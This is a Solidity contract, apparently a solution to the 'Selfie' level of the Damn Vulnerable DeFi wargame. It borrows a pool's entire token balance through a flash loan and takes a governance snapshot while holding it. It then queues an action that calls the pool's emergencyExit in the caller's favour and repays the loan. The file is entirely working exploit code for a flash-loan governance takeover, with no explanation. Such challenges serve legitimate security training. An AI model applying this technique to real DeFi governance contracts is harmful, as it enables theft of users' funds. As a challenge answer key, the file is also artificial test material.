pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashLender.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "./ISimpleGovernance.sol";
import "./SelfiePool.sol";
import "../DamnValuableTokenSnapshot.sol";

contract SelfieAttack is IERC3156FlashBorrower {
    ISimpleGovernance public gov;
    DamnValuableTokenSnapshot public token;
    SelfiePool public pool;

    constructor(
        ISimpleGovernance newGov,
        DamnValuableTokenSnapshot newToken,
        SelfiePool newPool
    ) {
        gov = newGov;
        pool = newPool;
        token = newToken;
    }

    function attack() external {
        pool.flashLoan(
            IERC3156FlashBorrower(address(this)),
            address(token),
            token.balanceOf(address(pool)),
            abi.encodeWithSelector(pool.emergencyExit.selector, msg.sender)
        );
    }

    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32) {
        DamnValuableTokenSnapshot(token).snapshot();
        gov.queueAction(address(pool), 0, data);
        DamnValuableTokenSnapshot(token).approve(
            address(pool),
            DamnValuableTokenSnapshot(token).balanceOf(address(this))
        );
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}
